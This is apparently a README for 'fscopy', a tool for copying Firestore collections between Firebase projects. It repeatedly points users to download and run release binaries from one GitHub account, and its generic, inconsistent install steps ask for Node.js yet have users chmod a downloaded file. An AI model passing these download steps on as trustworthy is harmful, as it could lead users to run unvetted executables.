# 🔥 fscopy - Effortlessly Copy Firestore Collections

## 🚀 Getting Started

fscopy is a fast command-line tool that allows you to easily copy Firestore collections between Firebase projects. Whether you're migrating data or backing up important information, fscopy makes the process straightforward and efficient.

## 📥 Download fscopy

[![Download fscopy](https://img.shields.io/badge/Download%20fscopy-v1.0-blue)](https://github.com/ITZJUSCOMBOZ886/fscopy/releases)

To download fscopy, visit this page: [Download fscopy](https://github.com/ITZJUSCOMBOZ886/fscopy/releases).

## 📦 System Requirements

- **Operating System:** Windows, macOS, or Linux.
- **Node.js:** Version 14 or higher must be installed. fscopy is built on Node.js, which allows it to run seamlessly across different platforms.
- **Firestore Access:** You need to have Firebase Cloud Firestore set up and access to your Firebase projects.

## 🛠️ Features

- **Support for Subcollections:** Easily transfer not just top-level collections but also their subcollections.
- **Data Filtering:** Choose specific documents to copy based on your needs.
- **Parallel Transfers:** Speed up the process by transferring multiple collections at the same time.
- **Data Transformations:** Apply transformations to your data before or during the transfer.
- **Webhooks:** Get notifications for the transfer process.
- **Resume Capability:** If your migration is large and interrupted, you can resume from where it left off.

## ⚙️ Installation Steps

Follow these steps to install fscopy on your system.

1. **Visit the Release Page:** Go to [Release Page](https://github.com/ITZJUSCOMBOZ886/fscopy/releases).
2. **Download the Latest Version:** Find the latest release and download the appropriate file for your operating system.
3. **Install fscopy:**
   - **For Windows:** Extract the downloaded ZIP file, and keep it in a location of your choice.
   - **For macOS and Linux:** You can move the downloaded file to a suitable directory and make it executable using the command: `chmod +x fscopy`.
4. **Add to Path (Optional):** If you want to run fscopy from any command line location, add the folder containing fscopy to your system’s PATH variable.

## 💻 Running fscopy

Once you have installed fscopy, you can start using it. Open your command line interface and run the following command to see the available options.

```bash
fscopy --help
```

This command will display detailed usage instructions and help you understand all available functions and how to use them.

## 📋 Usage Example

To copy a collection named `users` from one Firebase project to another, you could use the command:

```bash
fscopy copy --source <source-project-id> --destination <destination-project-id> --collection users
```

Replace `<source-project-id>` and `<destination-project-id>` with your actual Firebase project IDs.

## 🔍 Additional Information

- **Documentation:** For more details on specific commands, options, and advanced usage, refer to the fscopy documentation available on the GitHub repository.
- **Community Support:** If you run into issues, consider checking the Issues tab on the GitHub page. You can also raise questions or report bugs.

## 🌟 Contributing

Contributions are welcome! If you have ideas for improvements or new features, feel free to fork the repository and submit a pull request.

## 👥 Support 

If you need help, you can open an issue on the GitHub repository, and someone from the community will assist you. 

## 📥 Download fscopy Again

For your convenience, here is the link to download fscopy again: [Download fscopy](https://github.com/ITZJUSCOMBOZ886/fscopy/releases). 

Enjoy using fscopy for your Firestore data transfers!